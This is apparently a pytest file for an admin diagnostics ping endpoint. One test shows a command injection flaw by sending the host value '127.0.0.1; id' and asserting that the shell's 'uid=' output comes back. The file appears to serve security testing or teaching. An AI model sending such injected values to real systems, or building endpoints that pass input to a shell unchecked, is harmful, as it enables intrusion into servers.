def test_legitimate_ping(client, admin_headers):
    response = client.post(
        "/admin/diagnostics",
        data={"host": "127.0.0.1"},
        headers={**admin_headers, "Accept": "application/json"}
    )
    assert response.status_code == 200
    assert "127.0.0.1" in response.json()["output"]

def test_command_injection_vulnerable(client, admin_headers):
    """
    Demonstrates Command Injection vulnerability:
    Passing a shell metacharacter (;) allows executing arbitrary commands
    such as 'id' alongside the ping.
    """
    response = client.post(
        "/admin/diagnostics",
        data={"host": "127.0.0.1; id"},
        headers={**admin_headers, "Accept": "application/json"}
    )
    assert response.status_code == 200
    output = response.json()["output"]
    # The output of 'id' command contains 'uid='
    assert "uid=" in output
